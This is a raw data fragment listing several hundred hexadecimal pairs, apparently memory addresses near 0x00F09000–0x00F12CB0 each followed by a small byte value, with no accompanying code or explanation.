0x00F12778, 0x0000007A, 0x00F0DF88, 0x00000031, 0x00F11BC8, 0x0000000D, 0x00F0E5F8, 0x00000048, 0x00F09700, 0x00000030, 0x00F126E0, 0x00000040, 0x00F0E780, 0x00000004, 0x00F0F1A0, 0x00000002, 0x00F0C5F0, 0x00000075, 0x00F0CF48, 0x0000002D, 0x00F0E000, 0x0000001A, 0x00F0D9C8, 0x0000001A, 0x00F0B5C8, 0x0000003A, 0x00F0ED98, 0x00000064, 0x00F12350, 0x00000040, 0x00F0CC58, 0x00000027, 0x00F0FDE8, 0x0000006B, 0x00F10D20, 0x00000056, 0x00F09460, 0x0000006B, 0x00F0E4A8, 0x00000063, 0x00F0C190, 0x0000005E, 0x00F0C578, 0x00000072, 0x00F0DF78, 0x00000045, 0x00F0A3F0, 0x00000006, 0x00F0C590, 0x00000064, 0x00F0DDF0, 0x00000044, 0x00F0E710, 0x00000022, 0x00F10F80, 0x0000002E, 0x00F0CA30, 0x0000007D, 0x00F122E0, 0x00000026, 0x00F0B3F0, 0x00000074, 0x00F0C208, 0x0000005A, 0x00F10E48, 0x00000024, 0x00F0B460, 0x0000001D, 0x00F0AD00, 0x0000006A, 0x00F102F0, 0x00000025, 0x00F0DB58, 0x00000041, 0x00F0A948, 0x00000054, 0x00F0D450, 0x0000003C, 0x00F11098, 0x00000001, 0x00F0F7F8, 0x00000043, 0x00F0F3E0, 0x00000035, 0x00F10198, 0x00000008, 0x00F0D6E8, 0x00000024, 0x00F0A168, 0x00000043, 0x00F11C08, 0x00000019, 0x00F0FAD0, 0x00000048, 0x00F0F3C8, 0x0000001A, 0x00F0C908, 0x0000005D, 0x00F0EB50, 0x0000002F, 0x00F12378, 0x00000007, 0x00F0BA48, 0x00000061, 0x00F11B18, 0x00000022, 0x00F0CA58, 0x00000069, 0x00F0AC10, 0x0000000E, 0x00F0B5B0, 0x00000036, 0x00F0A368, 0x00000024, 0x00F0C9A0, 0x0000001C, 0x00F126C8, 0x00000054, 0x00F09808, 0x00000003, 0x00F0DA80, 0x0000002B, 0x00F0B5D0, 0x00000038, 0x00F11AF0, 0x00000077, 0x00F0C440, 0x00000062, 0x00F0E9F8, 0x00000003, 0x00F0EEF0, 0x0000001F, 0x00F0EFF8, 0x00000062, 0x00F0E678, 0x0000004C, 0x00F0B350, 0x00000071, 0x00F0A460, 0x0000001D, 0x00F09B68, 0x00000004, 0x00F0CD68, 0x00000059, 0x00F0C0A0, 0x00000040, 0x00F0D3E8, 0x00000004, 0x00F09930, 0x0000003F, 0x00F12798, 0x00000033, 0x00F09830, 0x00000075, 0x00F0DFB0, 0x00000065, 0x00F0BB18, 0x00000062, 0x00F0E500, 0x00000018, 0x00F0C150, 0x0000001F, 0x00F096F8, 0x00000068, 0x00F11D90, 0x00000045, 0x00F09400, 0x00000005, 0x00F12800, 0x00000043, 0x00F0A460, 0x00000043, 0x00F0F3A0, 0x00000015, 0x00F0C2C0, 0x00000004, 0x00F10120, 0x00000079, 0x00F0B4C0, 0x00000057, 0x00F0F3C0, 0x0000002A, 0x00F0ABE0, 0x00000007, 0x00F0E4B0, 0x00000010, 0x00F10968, 0x00000064, 0x00F0A1F8, 0x00000011, 0x00F0A248, 0x00000006, 0x00F0C908, 0x00000066, 0x00F12468, 0x00000069, 0x00F10FB0, 0x00000026, 0x00F098D8, 0x00000015, 0x00F12428, 0x0000005B, 0x00F0DCA8, 0x00000018, 0x00F0C5C0, 0x0000005C, 0x00F11D40, 0x00000034, 0x00F09DB0, 0x00000057, 0x00F0CA60, 0x0000006A, 0x00F0F188, 0x00000017, 0x00F0D5D8, 0x0000003D, 0x00F0A110, 0x0000000E, 0x00F0D380, 0x00000067, 0x00F0D0E0, 0x00000032, 0x00F09710, 0x00000065, 0x00F0ABF0, 0x00000039, 0x00F0EB08, 0x0000006F, 0x00F10428, 0x0000001E, 0x00F0DDC8, 0x00000068, 0x00F0C250, 0x0000001D, 0x00F11828, 0x0000003F, 0x00F113F8, 0x0000001F, 0x00F09528, 0x00000057, 0x00F0EB80, 0x0000000F, 0x00F10790, 0x0000007E, 0x00F0B340, 0x00000039, 0x00F0B8C8, 0x00000075, 0x00F0EC48, 0x0000002A, 0x00F0F138, 0x00000008, 0x00F0A500, 0x00000021, 0x00F0EBE0, 0x0000004F, 0x00F10980, 0x0000001B, 0x00F0BED8, 0x0000002D, 0x00F0B8F0, 0x0000006D, 0x00F0A408, 0x00000057, 0x00F0DCA8, 0x0000001B, 0x00F0B660, 0x00000046, 0x00F0BE58, 0x0000004B, 0x00F09EF0, 0x0000003B, 0x00F0E198, 0x00000078, 0x00F0D210, 0x0000003A, 0x00F097A8, 0x00000063, 0x00F0A5F0, 0x0000003C, 0x00F12358, 0x00000046, 0x00F09608, 0x00000042, 0x00F0E168, 0x0000005E, 0x00F0A6F8, 0x0000004B, 0x00F104F8, 0x0000003B, 0x00F11910, 0x0000003A, 0x00F0D708, 0x00000003, 0x00F0B0A0, 0x00000024, 0x00F0D138, 0x0000000C, 0x00F0FAD8, 0x00000021, 0x00F09618, 0x00000071, 0x00F0BE60, 0x00000019, 0x00F118C0, 0x00000014, 0x00F0E818, 0x0000002C, 0x00F12AC0, 0x00000015, 0x00F09D88, 0x00000005, 0x00F09480, 0x00000072, 0x00F0B538, 0x00000003, 0x00F0E748, 0x00000011, 0x00F0DDD0, 0x00000044, 0x00F0C718, 0x0000006D, 0x00F0E278, 0x0000001B, 0x00F0EB70, 0x0000006D, 0x00F12108, 0x0000006F, 0x00F09C48, 0x00000050, 0x00F0E8C8, 0x0000002A, 0x00F10E30, 0x00000053, 0x00F129B0, 0x00000014, 0x00F12828, 0x0000000C, 0x00F0EF68, 0x00000045, 0x00F0C588, 0x00000076, 0x00F0DA50, 0x0000002A, 0x00F0DCC0, 0x00000060, 0x00F0C240, 0x00000016, 0x00F0AC70, 0x00000009, 0x00F10BA8, 0x00000013, 0x00F10620, 0x0000002F, 0x00F0C390, 0x00000036, 0x00F117A8, 0x00000067, 0x00F12588, 0x0000004D, 0x00F09290, 0x0000006D, 0x00F121B8, 0x00000027, 0x00F0F230, 0x00000052, 0x00F0C2A8, 0x00000034, 0x00F0DB60, 0x00000031, 0x00F10450, 0x00000068, 0x00F0A500, 0x00000055, 0x00F0A9D8, 0x0000006E, 0x00F11958, 0x0000006A, 0x00F0FDA8, 0x00000036, 0x00F09998, 0x00000043, 0x00F107C8, 0x00000070, 0x00F10CD0, 0x00000028, 0x00F0A2D0, 0x00000061, 0x00F0B7B0, 0x00000057, 0x00F0C520, 0x00000033, 0x00F12C48, 0x00000015, 0x00F0D828, 0x00000041, 0x00F0DA90, 0x0000007B, 0x00F0D0C0, 0x00000069, 0x00F0D120, 0x00000000, 0x00F10C78, 0x00000059, 0x00F10BA8, 0x00000026, 0x00F09788, 0x0000007D, 0x00F0D0C8, 0x00000015, 0x00F0D528, 0x00000003, 0x00F0B940, 0x0000005A, 0x00F0E3F0, 0x00000006, 0x00F0D4E8, 0x00000025, 0x00F10178, 0x00000053, 0x00F09E08, 0x00000044, 0x00F0A888, 0x00000001, 0x00F0A7C0, 0x0000001C, 0x00F0A7D0, 0x00000011, 0x00F0CF50, 0x00000004, 0x00F122C0, 0x00000010, 0x00F0E9A0, 0x00000018, 0x00F0C7F8, 0x00000046, 0x00F09480, 0x0000000B, 0x00F0CD38, 0x00000069, 0x00F0D4D0, 0x00000009, 0x00F11FC8, 0x00000004, 0x00F0FD68, 0x00000019, 0x00F0A698, 0x0000005D, 0x00F09FF0, 0x00000018, 0x00F11358, 0x00000032, 0x00F0D7B0, 0x00000060, 0x00F0D100, 0x0000007A, 0x00F120F0, 0x00000006, 0x00F09F78, 0x0000000F, 0x00F09BB0, 0x00000049, 0x00F0CF28, 0x00000065, 0x00F0F670, 0x00000041, 0x00F0A240, 0x00000046, 0x00F0CF48, 0x00000048, 0x00F12398, 0x0000002E, 0x00F0AFF8, 0x0000001F, 0x00F09888, 0x00000028, 0x00F09290, 0x00000071, 0x00F0F808, 0x0000006A, 0x00F0D2D8, 0x00000024, 0x00F0C858, 0x00000004, 0x00F0CDA8, 0x00000009, 0x00F09858, 0x00000054, 0x00F0A510, 0x00000075, 0x00F0FE98, 0x00000022, 0x00F10970, 0x0000004C, 0x00F0C6B0, 0x00000015, 0x00F09608, 0x0000006F, 0x00F09B50, 0x00000056, 0x00F10800, 0x0000004D, 0x00F111A8, 0x00000030, 0x00F0BD30, 0x00000050, 0x00F09C20, 0x0000004B, 0x00F0B7F8, 0x0000007B, 0x00F0A080, 0x0000000F, 0x00F0E1E8, 0x0000000C, 0x00F0BC08, 0x0000003D, 0x00F0A1B8, 0x0000003F, 0x00F0ECB8, 0x00000021, 0x00F0B7F0, 0x0000003F, 0x00F12138, 0x00000013, 0x00F105D0, 0x0000003B, 0x00F0B658, 0x0000002E, 0x00F0B228, 0x0000003C, 0x00F0D330, 0x0000005F, 0x00F0C8B0, 0x00000030, 0x00F0B030, 0x00000039, 0x00F09BC0, 0x0000003F, 0x00F0C1D8, 0x00000029, 0x00F0BFA0, 0x00000077, 0x00F113B0, 0x0000000C, 0x00F0F068, 0x0000003F, 0x00F0D8A8, 0x00000038, 0x00F10A10, 0x0000002E, 0x00F0BAF8, 0x00000061, 0x00F0C4C8, 0x00000057, 0x00F0A4D8, 0x00000017, 0x00F12990, 0x0000006D, 0x00F121F0, 0x00000029, 0x00F0A790, 0x00000069, 0x00F0DCE0, 0x0000002B, 0x00F0AA88, 0x0000002E, 0x00F0B9B0, 0x00000079, 0x00F0BB70, 0x00000039, 0x00F0E268, 0x0000006B, 0x00F10AC8, 0x0000004D, 0x00F11430, 0x00000010, 0x00F0DDC8, 0x0000004F, 0x00F106F8, 0x00000034, 0x00F11578, 0x00000028, 0x00F0DAC8, 0x0000007A, 0x00F0A018, 0x0000005F, 0x00F0FA30, 0x0000004B, 0x00F0BC70, 0x0000005B, 0x00F0CEA0, 0x0000006B, 0x00F11E40, 0x0000005E, 0x00F0C1D8, 0x00000072, 0x00F0F950, 0x00000031, 0x00F11FA0, 0x00000011, 0x00F126B0, 0x00000030, 0x00F0C458, 0x00000022, 0x00F10030, 0x0000000F, 0x00F0D770, 0x0000002F, 0x00F0E218, 0x0000007D, 0x00F0D4F0, 0x0000005D, 0x00F0F2B8, 0x00000026, 0x00F0CF68, 0x0000003F, 0x00F0ABE0, 0x0000001C, 0x00F10C00, 0x00000034, 0x00F0D330, 0x0000002D, 0x00F11C80, 0x00000038, 0x00F0B678, 0x0000002D, 0x00F10220, 0x00000053, 0x00F0D410, 0x00000044, 0x00F0B148, 0x00000001, 0x00F0D310, 0x00000041, 0x00F11CA0, 0x00000046, 0x00F0E0D8, 0x00000074, 0x00F0CD78, 0x00000069, 0x00F10248, 0x0000002D, 0x00F10790, 0x00000046, 0x00F0A748, 0x0000004D, 0x00F0CEA0, 0x00000062, 0x00F11720, 0x00000000, 0x00F0B658, 0x0000003B, 0x00F0CA58, 0x0000002F, 0x00F10000, 0x00000045, 0x00F10EF8, 0x00000012, 0x00F0F470, 0x00000052, 0x00F09B40, 0x00000022, 0x00F0A3A0, 0x00000032, 0x00F0E348, 0x0000002E, 0x00F10FC8, 0x00000037, 0x00F0B3C8, 0x0000005C, 0x00F12600, 0x00000020, 0x00F0EEE8, 0x0000006E, 0x00F12720, 0x00000067, 0x00F123A0, 0x00000065, 0x00F09BB0, 0x00000008, 0x00F094A0, 0x00000023, 0x00F0B2E0, 0x00000037, 0x00F11E58, 0x00000051, 0x00F09AE0, 0x0000002B, 0x00F0DCC0, 0x0000006A, 0x00F11310, 0x00000060, 0x00F12258, 0x00000024, 0x00F0E7F0, 0x00000078, 0x00F0ED10, 0x00000063, 0x00F0A008, 0x0000003D, 0x00F12530, 0x00000053, 0x00F0CD10, 0x00000021, 0x00F10770, 0x00000072, 0x00F0A9A0, 0x00000025, 0x00F103D0, 0x00000065, 0x00F09B90, 0x00000032, 0x00F0F710, 0x00000041, 0x00F11DB0, 0x00000063, 0x00F0B500, 0x00000036, 0x00F0B0A8, 0x00000067, 0x00F0F150, 0x00000044, 0x00F09E38, 0x00000050, 0x00F0A2A8, 0x00000054, 0x00F0C7F0, 0x00000013, 0x00F10038, 0x00000075, 0x00F0C0E8, 0x00000008, 0x00F12920, 0x00000005, 0x00F11460, 0x00000024, 0x00F0CB60, 0x0000001C, 0x00F0D588, 0x00000047, 0x00F0A010, 0x00000062, 0x00F0E240, 0x00000052, 0x00F0AF78, 0x00000045, 0x00F0C530, 0x00000063, 0x00F11240, 0x0000001D, 0x00F0B058, 0x00000066, 0x00F10930, 0x0000004E, 0x00F095F0, 0x00000060, 0x00F0B168, 0x00000061, 0x00F0CB68, 0x00000020, 0x00F11DB8, 0x0000001F, 0x00F107A8, 0x0000002F, 0x00F0D388, 0x0000004C, 0x00F11738, 0x00000044, 0x00F0BFB0, 0x0000006D, 0x00F0D560, 0x00000002, 0x00F0D458, 0x00000022, 0x00F0CB90, 0x00000041, 0x00F119E0, 0x0000003C, 0x00F0A1B8, 0x00000043, 0x00F0DA28, 0x00000077, 0x00F0AAA8, 0x00000078, 0x00F12890, 0x00000064, 0x00F0D0F8, 0x00000039, 0x00F0E5D8, 0x0000001F, 0x00F0C1D8, 0x0000002E, 0x00F0BD10, 0x00000043, 0x00F0E3C0, 0x00000033, 0x00F112B8, 0x0000002C, 0x00F0E910, 0x00000007, 0x00F0BE70, 0x00000016, 0x00F0A0A0, 0x0000006B, 0x00F0E5F8, 0x0000000F, 0x00F0AB70, 0x0000003A, 0x00F0BBF8, 0x00000060, 0x00F0A3B8, 0x00000077, 0x00F119E8, 0x00000055, 0x00F0A520, 0x00000056, 0x00F11000, 0x00000004, 0x00F0BA88, 0x00000065, 0x00F0ADF0, 0x0000000F, 0x00F11C78, 0x0000002D, 0x00F0E6C0, 0x0000006D, 0x00F10C78, 0x0000007C, 0x00F0D6E8, 0x0000004B, 0x00F09230, 0x00000057, 0x00F10AD8, 0x00000069, 0x00F0DA50, 0x00000009, 0x00F0E3A8, 0x0000003B, 0x00F11060, 0x00000066, 0x00F0F5D0, 0x0000000F, 0x00F0DBB0, 0x0000005B, 0x00F0E0D0, 0x00000076, 0x00F099F8, 0x00000022, 0x00F0E930, 0x0000005B, 0x00F0BFE0, 0x00000060, 0x00F0B940, 0x00000055, 0x00F11990, 0x00000079, 0x00F0F208, 0x00000054, 0x00F09508, 0x0000005D, 0x00F0DD50, 0x00000077, 0x00F0F198, 0x0000000F, 0x00F0C268, 0x00000067, 0x00F0C728, 0x00000044, 0x00F0B2E8, 0x00000062, 0x00F11028, 0x00000053, 0x00F0C918, 0x00000051, 0x00F0DDE8, 0x00000032, 0x00F0A3D8, 0x0000003E, 0x00F0DF78, 0x00000062, 0x00F0DFF0, 0x00000039, 0x00F117D0, 0x00000003, 0x00F126C0, 0x00000043, 0x00F0BD58, 0x00000056, 0x00F0B2E8, 0x0000004E, 0x00F0CB38, 0x00000009, 0x00F10D00, 0x0000002D, 0x00F0C080, 0x00000065, 0x00F0D960, 0x00000032, 0x00F0ADF0, 0x00000070, 0x00F0CDB8, 0x00000064, 0x00F0CC40, 0x0000007A, 0x00F0C8A0, 0x00000057, 0x00F0EA20, 0x0000002C, 0x00F11600, 0x0000003A, 0x00F0BD18, 0x00000009, 0x00F0DC30, 0x00000017, 0x00F09AC0, 0x00000014, 0x00F0E5F8, 0x0000004D, 0x00F10458, 0x00000071, 0x00F12460, 0x00000063, 0x00F0F188, 0x00000023, 0x00F0B9B0, 0x0000000B, 0x00F0D830, 0x00000004, 0x00F11E48, 0x0000001C, 0x00F0C068, 0x00000044, 0x00F0E898, 0x0000004E, 0x00F0D2F8, 0x0000003A, 0x00F0ECD8, 0x00000076, 0x00F0D490, 0x00000057, 0x00F0A680, 0x0000001E, 0x00F0B860, 0x00000071, 0x00F09300, 0x00000017, 0x00F108C8, 0x00000043, 0x00F0D798, 0x00000013, 0x00F10B08, 0x00000058, 0x00F0B0F0, 0x0000003D, 0x00F0C0F0, 0x00000030, 0x00F12860, 0x0000005A, 0x00F124A0, 0x00000075, 0x00F0C550, 0x00000016, 0x00F09288, 0x00000064, 0x00F0B050, 0x00000050, 0x00F0FA38, 0x00000059, 0x00F0FB50, 0x0000002E, 0x00F09180, 0x00000035, 0x00F10FE8, 0x00000045, 0x00F0C010, 0x0000005A, 0x00F09D58, 0x00000003, 0x00F0CD58, 0x00000027, 0x00F0D128, 0x0000005A, 0x00F11B30, 0x0000000A, 0x00F0AE20, 0x0000002E, 0x00F10530, 0x00000025, 0x00F0CED0, 0x0000000D, 0x00F093D8, 0x00000030, 0x00F0A480, 0x0000003F, 0x00F12198, 0x0000005A, 0x00F12690, 0x00000047, 0x00F0C710, 0x00000007, 0x00F0AAC0, 0x00000029, 0x00F11728, 0x00000026, 0x00F12CB0, 0x00000035, 0x00F0ECA0, 0x0000006E, 0x00F10AB8, 0x0000004C, 0x00F0F5B0, 0x0000003B, 0x00F0B128, 0x00000013, 0x00F0D708, 0x00000068, 0x00F0E460, 0x00000035, 0x00F0C490, 0x00000056, 0x00F106C0, 0x00000038, 0x00F12690, 0x00000011, 0x00F0A120, 0x0000005F, 0x00F0D410, 0x00000018, 0x00F11A20, 0x00000036, 0x00F09540, 0x00000058, 0x00F11EA8, 0x00000034, 0x00F10AD0, 0x00000077, 0x00F0A0D8, 0x0000001B, 0x00F0D090, 0x0000003D, 0x00F10AA0, 0x0000000E, 0x00F09498, 0x00000068, 0x00F0A7A0, 0x00000052, 0x00F0D918, 0x0000003D, 0x00F0E938, 0x00000072, 0x00F0FA10, 0x00000007, 0x00F0B130, 0x0000001D, 0x00F0D250, 0x0000005B, 0x00F0C3E0, 0x00000061, 0x00F0D678, 0x00000076, 0x00F0D040, 0x00000045, 0x00F0D6C0, 0x0000004F, 0x00F0A448, 0x00000047, 0x00F0C0B8, 0x0000005F, 0x00F0CCA8, 0x0000004B, 0x00F0C470, 0x00000040, 0x00F0D210, 0x00000006, 0x00F0A0D0, 0x0000007A, 0x00F0ED80, 0x00000055, 0x00F0F2E0, 0x0000003E, 0x00F099F0, 0x00000034, 0x00F0B6E8, 0x0000005C, 0x00F0B120, 0x00000027, 0x00F0E510, 0x00000040, 0x00F0C108, 0x0000005C, 0x00F0B148, 0x00000039, 0x00F0AAB8, 0x00000047, 0x00F0A918, 0x00000050, 0x00F0B9A0, 0x00000001, 0x00F09C58, 0x00000076, 0x00F12310, 0x00000043, 0x00F0F128, 0x00000059, 0x00F12388, 0x00000023, 0x00F0F890, 0x00000029, 0x00F0F650, 0x00000006, 0x00F11CD8, 0x00000005, 0x00F09378, 0x0000006B, 0x00F0DFA0, 0x00000066, 0x00F12410, 0x00000065, 0x00F0CCE0, 0x00000050, 0x00F0A560, 0x0000000E, 0x00F0A948, 0x0000000B, 0x00F10378, 0x0000003A, 0x00F0F348, 0x0000002D, 0x00F0B370, 0x0000002D, 0x00F0EC30, 0x00000041, 0x00F0FE98, 0x00000026, 0x00F0B6D0, 0x0000004F, 0x00F0CA88, 0x00000071, 0x00F0B820, 0x00000012, 0x00F0B958, 0x00000070, 0x00F122C8, 0x00000016, 0x00F0C7E0, 0x00000034, 0x00F0B4B0, 0x0000001E, 0x00F090C8, 0x0000000F, 0x00F0EFE8, 0x0000000A, 0x00F0E6E0, 0x00000059, 0x00F12338, 0x0000007C, 0x00F0D2D0, 0x0000003C, 0x00F112C8, 0x0000001C, 0x00F0EBF8, 0x00000036, 0x00F11B48, 0x0000002D, 0x00F0D9C0, 0x00000041, 0x00F0B358, 0x00000056, 0x00F09E50, 0x0000002C, 0x00F0AAB8, 0x0000003A, 0x00F0B188, 0x0000004D, 0x00F0D5E8, 0x00000058, 0x00F0B060, 0x00000053, 0x00F0CF20, 0x00000064, 0x00F11FB8, 0x00000007, 0x00F0A5B8, 0x00000053, 0x00F11B80, 0x0000004D, 0x00F114D0, 0x00000007, 0x00F0DDF8, 0x0000001A, 0x00F106D8, 0x0000003A, 0x00F0DD78, 0x00000038, 0x00F0C560, 0x00000010, 0x00F105D0, 0x00000006, 0x00F0EE00, 0x00000006, 0x00F10E20, 0x00000037, 0x00F0FDE0, 0x00000011, 0x00F0A530, 0x00000078, 0x00F09880, 0x00000024, 0x00F100B0, 0x00000034, 0x00F0AF70, 0x00000000, 0x00F0BF68, 0x00000053, 0x00F12010, 0x00000079, 0x00F12110, 0x00000021, 0x00F122D0, 0x00000010, 0x00F0CE28, 0x00000045, 0x00F0B2C8, 0x00000011, 0x00F0E630, 0x0000006D, 0x00F0CDF0, 0x00000021, 0x00F0D978, 0x00000017, 0x00F10C50, 0x0000005E, 0x00F094F8, 0x0000001B, 0x00F0E810, 0x0000006B, 0x00F11348, 0x0000007C, 0x00F128D0, 0x00000032, 0x00F0AAA0, 0x0000006B, 0x00F0D818, 0x00000022, 0x00F0BA60, 0x00000028, 0x00F0CEA8, 0x00000030, 0x00F0F8C8, 0x00000030, 0x00F11F48, 0x0000005C, 0x00F0E130, 0x0000005B, 0x00F0F200, 0x0000000E, 0x00F0EBA8, 0x00000041, 0x00F110C0, 0x0000000A, 0x00F12208, 0x00000033, 0x00F0A888, 0x0000004B, 0x00F0EF60, 0x00000008, 0x00F0A1D0, 0x00000009, 0x00F0AF10, 0x00000004, 0x00F0A750, 0x00000023, 0x00F0BC68, 0x00000031, 0x00F0B318, 0x00000062, 0x00F10A10, 0x00000059, 0x00F12348, 0x00000015, 0x00F0EBA8, 0x00000003, 0x00F0FC20, 0x00000022, 0x00F12B88, 0x0000001C, 0x00F105D0, 0x00000009, 0x00F12BD0, 0x00000043, 0x00F096D0, 0x00000051, 0x00F09DF0, 0x0000004B, 0x00F0E0A0, 0x0000001C, 0x00F0BDC8, 0x00000059, 0x00F10F20, 0x0000000D, 0x00F0B940, 0x00000067, 0x00F0AE80, 0x00000007, 0x00F0D8C8, 0x0000006B, 0x00F0CE00, 0x00000040, 0x00F0E288, 0x0000006A, 0x00F0CDB0, 0x0000002E, 0x00F0C9F0, 0x00000042, 0x00F0DC30, 0x00000079, 0x00F0C730, 0x00000071, 0x00F0C078, 0x00000040, 0x00F0F3F8, 0x0000002B, 0x00F0FA18, 0x0000006E, 0x00F0DC40, 0x0000006F, 0x00F10360, 0x00000009, 0x00F0DEB8, 0x0000000F, 0x00F0D3B8, 0x00000009, 0x00F121A8, 0x00000023, 0x00F091A8, 0x0000004C, 0x00F10BC0, 0x00000027, 0x00F0C1F8, 0x00000023, 0x00F0DD80, 0x00000004, 0x00F0D298, 0x00000067, 0x00F09AE0, 0x00000048, 0x00F09AE8, 0x00000067, 0x00F115E8, 0x0000006D, 0x00F0DBB8, 0x0000005C, 0x00F096D0, 0x00000056, 0x00F0E758, 0x0000003E, 0x00F0B030, 0x00000061, 0x00F09A00, 0x00000032, 0x00F0A3B8, 0x00000052, 0x00F12460, 0x0000006F, 0x00F12340, 0x00000060, 0x00F09C48, 0x00000053, 0x00F0FC10, 0x00000014, 0x00F0AF98, 0x0000005D, 0x00F0AAF0, 0x00000075, 0x00F11480, 0x00000015, 0x00F0DFB8, 0x00000011, 0x00F0E0C8, 0x00000051, 0x00F100B0, 0x00000050, 0x00F12408, 0x0000006B, 0x00F0BFA8, 0x0000004C, 0x00F10018, 0x00000003, 0x00F11078, 0x00000003, 0x00F0A0C8, 0x00000023, 0x00F110C0, 0x00000077, 0x00F12A90, 0x00000023, 0x00F0D348, 0x0000006D, 0x00F0FDD8, 0x00000058, 0x00F11038, 0x00000010, 0x00F09190, 0x00000026, 0x00F0B3A8, 0x00000039, 0x00F0BDB0, 0x00000077, 0x00F09D78, 0x0000003F, 0x00F0E758, 0x0000000D, 0x00F0D648, 0x00000074, 0x00F0BE68, 0x00000064, 0x00F09D70, 0x0000003F, 0x00F0CD58, 0x00000066, 0x00F106A8, 0x00000060, 0x00F09B30, 0x0000004C, 0x00F0AA08, 0x00000075, 0x00F0CC10, 0x00000066, 0x00F0A940, 0x00000040, 0x00F0B2E0, 0x0000000C, 0x00F12538, 0x0000001F, 0x00F0B7A0, 0x0000001C, 0x00F10220, 0x0000006E, 0x00F0D2A8, 0x00000030, 0x00F09F20, 0x00000025, 0x00F0FAD8, 0x00000053, 0x00F112B0, 0x0000006A, 0x00F0EFE0, 0x00000026, 0x00F0AA78, 0x00000005, 0x00F0DA10, 0x00000002, 0x00F101F8, 0x0000002D, 0x00F09DC0, 0x00000008, 0x00F113E0, 0x0000006E, 0x00F10158, 0x00000067, 0x00F0DFF0, 0x00000077, 0x00F09218, 0x0000007E, 0x00F10950, 0x0000006C, 0x00F10610, 0x0000004A, 0x00F0DB58, 0x0000005C, 0x00F0BDA0, 0x0000004C, 0x00F09AB0, 0x00000036, 0x00F0DA80, 0x00000045, 0x00F126A8, 0x00000063, 0x00F0C6F0, 0x00000078, 0x00F0C6B8, 0x0000001E, 0x00F0A988, 0x0000004D, 0x00F102A8, 0x00000049, 0x00F0B1B8, 0x00000016, 0x00F0A180, 0x0000002E, 0x00F0FD70, 0x0000003D, 0x00F12188, 0x00000058, 0x00F0FFC8, 0x0000002C, 0x00F0AE48, 0x0000004B, 0x00F12AA0, 0x0000001D, 0x00F0B510, 0x00000075, 0x00F126E0, 0x00000044, 0x00F09EA8, 0x0000000D, 0x00F0CCD0, 0x0000006E, 0x00F11770, 0x0000003B, 0x00F12C50, 0x00000009, 0x00F12AB0, 0x00000031, 0x00F0C0F8, 0x0000002E, 0x00F0F078, 0x00000037, 0x00F11AD0, 0x0000001D, 0x00F0C628, 0x00000022, 0x00F116D0, 0x00000067, 0x00F11090, 0x00000052, 0x00F090F0, 0x00000077, 0x00F0A410, 0x00000036, 0x00F0F308, 0x0000006F, 0x00F09608, 0x00000053, 0x00F11C60, 0x00000071, 0x00F0BB90, 0x00000075, 0x00F0D118, 0x00000040, 0x00F0C108, 0x00000070, 0x00F128C8, 0x00000072, 0x00F0E918, 0x0000000F, 0x00F12968, 0x0000006F, 0x00F0F128, 0x00000023, 0x00F0A408, 0x00000033, 0x00F096D0, 0x00000067, 0x00F10640, 0x00000048, 0x00F0D348, 0x0000007E, 0x00F0ED48, 0x0000002B, 0x00F0F130, 0x00000052, 0x00F0FA08, 0x00000000, 0x00F0B240, 0x00000034, 0x00F093A8, 0x0000001C, 0x00F0CED8, 0x00000058, 0x00F0C0C0, 0x00000015, 0x00F11F78, 0x00000030, 0x00F0AC90, 0x0000002F, 0x00F0FC40, 0x0000002B, 0x00F11910, 0x00000048, 0x00F10138, 0x00000062, 0x00F11A70, 0x0000004D, 0x00F0EE88, 0x0000003D, 0x00F11C80, 0x00000030, 0x00F0BD38, 0x00000019, 0x00F0E9D0, 0x0000007B, 0x00F0BC30, 0x0000006A, 0x00F0A070, 0x00000076, 0x00F12538, 0x00000000, 0x00F0C038, 0x0000006D, 0x00F0FDD0, 0x0000004B, 0x00F0EBE0, 0x0000002E, 0x00F0A530, 0x0000004C, 0x00F0C470, 0x00000027, 0x00F0E220, 0x0000002A, 0x00F11EC0, 0x00000052, 0x00F0BEE8, 0x00000071, 0x00F0DBF0, 0x0000004C, 0x00F0B148, 0x0000000E, 0x00F0FBC8, 0x00000055, 0x00F0B2D0, 0x00000006, 0x00F0CE90, 0x00000002, 0x00F10240, 0x00000073, 0x00F0C0E8, 0x00000064, 0x00F0B978, 0x0000004A, 0x00F0E4C8, 0x0000007E, 0x00F09E68, 0x0000000F, 0x00F0CFA8, 0x00000038, 0x00F11000, 0x00000041, 0x00F11528, 0x0000002D, 0x00F0A638, 0x00000051, 0x00F117E0, 0x00000013, 0x00F09200, 0x00000074, 0x00F102E0, 0x0000007B, 0x00F0DF90, 0x0000006E, 0x00F098A0, 0x00000055, 0x00F0D6A0, 0x00000059, 0x00F0F9C8, 0x00000043, 0x00F0B8F0, 0x00000006, 0x00F10D08, 0x00000041, 0x00F0D7B0, 0x0000004A, 0x00F12BA0, 0x00000049, 0x00F097B0, 0x00000006, 0x00F0EB58, 0x00000041, 0x00F0D658, 0x00000030, 0x00F0C030, 0x00000074, 0x00F12490, 0x00000011, 0x00F0E080, 0x00000073, 0x00F0C9B0, 0x0000003A, 0x00F11FF0, 0x0000000D, 0x00F0FDA8, 0x00000012, 0x00F0C800, 0x00000038, 0x00F0DC18, 0x00000046, 0x00F0BAF8, 0x0000002A, 0x00F0AC78, 0x00000067, 0x00F0FFC0, 0x0000006B, 0x00F0B5A8, 0x0000005F, 0x00F12838, 0x00000036, 0x00F09A20, 0x0000003F, 0x00F10CF8, 0x00000046, 0x00F0E8C8, 0x00000062, 0x00F0E2C8, 0x0000001D, 0x00F10FD8, 0x00000001, 0x00F121A0, 0x0000004B, 0x00F0AA00, 0x00000032, 0x00F0C960, 0x00000018, 0x00F0F900, 0x0000005E, 0x00F11170, 0x00000067, 0x00F0FA88, 0x0000002B, 0x00F0F610, 0x00000007, 0x00F0C910, 0x00000005, 0x00F09B50, 0x0000002E, 0x00F0EEE8, 0x00000015, 0x00F0A898, 0x0000000E, 0x00F0BF70, 0x00000071, 0x00F10108, 0x00000027, 0x00F11BC8, 0x0000004B, 0x00F098B8, 0x00000031, 0x00F0F198, 0x00000060, 0x00F0CF78, 0x00000053, 0x00F0ED78, 0x0000007E, 0x00F0A138, 0x0000001C, 0x00F0C120, 0x0000005A, 0x00F0C5E8, 0x0000003E, 0x00F0B468, 0x00000010, 0x00F0AF28, 0x00000018, 0x00F0C808, 0x0000006D, 0x00F11900, 0x00000036, 0x00F113A0, 0x0000001A, 0x00F0B8B8, 0x0000000B, 0x00F12370, 0x00000077, 0x00F0D580, 0x00000031, 0x00F0E590, 0x00000008, 0x00F0D800, 0x00000019, 0x00F12050, 0x00000014, 0x00F0D310, 0x00000033, 0x00F0A708, 0x00000061, 